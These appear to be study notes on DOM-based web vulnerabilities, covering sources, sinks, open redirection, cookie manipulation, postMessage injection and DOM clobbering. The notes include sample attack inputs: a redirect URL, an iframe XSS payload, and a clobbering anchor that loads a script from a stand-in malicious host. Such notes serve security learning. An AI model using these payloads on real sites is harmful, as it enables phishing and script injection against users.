## What is DOM?

- Document Object Model - web browser's hierarchical representation of the elements on the page
- Websites can use JS to manipulate the nodes and objects of the DOM, as well as their properties
- DOM based vulnerabilities arise when a website contains JS that takes an attacker-controllable value known as a source, and passes it into a dangerous function known as a sink

## Source

- a JS property that accepts data that is potentially attacker-controlled
- eg - `location.search` property as it reads the input from the query string which is relatively simple for an attacker to control
- any property that can be controlled by the attacker is a potential source
- this includes the referring URL (exposed by the `document.referrer` string), the user's cookies (exposed by the `document.cookie` string) , and web messages

## Sinks

- potentially dangerous JS function or DOM object that can cause undesirable effects if attacker-controlled data is passed to it
- eg - `eval()` function as it processes the argument that is passed to it as JS
- example of HTML sink is `document.body.innerHTML` as it potentially allows the attacker to inject malicious HTML and execute arbitary JS

- Fundamentally, DOM-based vulnerabilities arise when a website passes data from a source to a sink, which then handles the data in an unsafe way in the context of the client's session
- eg -

```js
var goto = location.hash.slice(1);
if (goto.startsWith("https:")) {
  location = goto;
}
```

- this leads to `DOM-based open redirection` as the `location.hash` source is handled in an unsafe way
- if the URL contains a hash fragment that starts with https:, this code extracts the value of the location.hash property and sets it as the location property of the window
- attacker can exploit this vulnerability by constructing the following URL:

```
https://www.innocent-webiste.com/example#https://www.evil-website.com
```

- When a victim visits this URL, the JS sets the value of the location property to `https://www.evil-website.com`, which automatically redirects the victim to the malicious site

## Common sources

```js
document.URL;
document.documentURI;
document.URLUnencoded;
document.baseURI;
location;
document.cookie;
document.referrer;
window.name;
history.pushState;
history.replaceState;
localStorage;
sessionStorage;
IndexedDB;
Database;
```

## Common Sinks

| DOM-based vulnerability          | Example sink             |
| -------------------------------- | ------------------------ |
| DOM XSS                          | document.write()         |
| Open redirection                 | window.location          |
| Cookie manipulation              | document.cookie          |
| JS injection                     | eval()                   |
| Document-domain manipulation     | document.domain          |
| WebSocket-URL poisoning          | WebSocket()              |
| Link manipulation                | element.src              |
| Web message manipulation         | postMessage()            |
| Ajax request-header manipulation | setRequestHeader()       |
| Local file-path manipulation     | FileReader.readAsText()  |
| Client-side SQL injection        | ExecuteSql()             |
| HTML5-storage manipulation       | sessionStorage.setItem() |
| Client-side XPath injection      | document.evaluate()      |
| Client-side JSON injection       | JSON.parse()             |
| DOM-data manipulation            | element.setAttribute()   |
| Denial of service                | RegExp()                 |

### DOM-based Open redirection

- arise when a script writes attacker-controlled data into a sink that can trigger cross-domain navigation
- eg - vulnerable due to the unsafe way it handles the `location.hash` property

```js
let url = /https:?:\/\/.+/.exec(location.hash);
if (url) {
  location = url[0];
}
```

- attacker may be able to use this vulnerability to contruct a URL that if visited by another user, will cause a redirection to an arbitary external domain

**Impact**

- phishing attacks against users of the website

- Sinks that lead to DOM-based Open Redirection

```
location
location.host
location.hostname
location.href
location.pathname
location.search
location.protocol
location.assign()
location.replace()
open()
element.srcdoc
XMLHttpRequest.open()
XMLHttpRequest.send()
jQuery.ajax()
$.ajax()
```

### DOM-bsaed cookie manipulation

- arises when a script writes attacker-controllable data into the value of a cookie
- attacker has to construct a URL that if visited by another user, will set an arbitary value in the user's cookie
- eg - JS writes data from a source into `document.cookie` without sanitizing it first, an attacker can manipulate the value of a single cookie to inject arbitary values

```javascript
document.cookie = "cookieName=" + location.hash.slice(1);
```

> `document.cookie` sink can lead to DOM-based cookie-manipulation vulnerabilities

### Controlling Web Message source

- consider the following code:

```html
<script>
  window.addEventListener("message", function (e) {
    eval(e.data);
  });
</script>
```

- This is vulnerable because an attacker could inject a JS payload by constructing the following iframe:

```html
<iframe
  src="//vulnerable-website"
  onload="this.contentWindow.postMessage('<img src=1 onerror=print()>', '*')"
></iframe>
```

### DOM clobbering

- technique in which you inject HTML into a page to manipulate the DOM and ultimately change the behavior of JS on the page
- useful in cases where XSS is not possible but can control some HTML on a page where the attributes id or name are whitelisted

- eg - you can use DOM objects to overwrite other JS objects and exploit unsafe names, such as `submit` to interfere with a form's actual `submit()` function

```html
<script>
  window.onload = function () {
    let someObject = window.someObject || {};
    let script = document.createElement("script");
    script.src = someObject.url;
    document.body.appendChild(script);
  };
</script>
```

- To exploit the vulnerable code ,

```html
<a id="someObject"
  ><a id=someObject name=url href=//malicious-website.com/evil.js></a
>
```
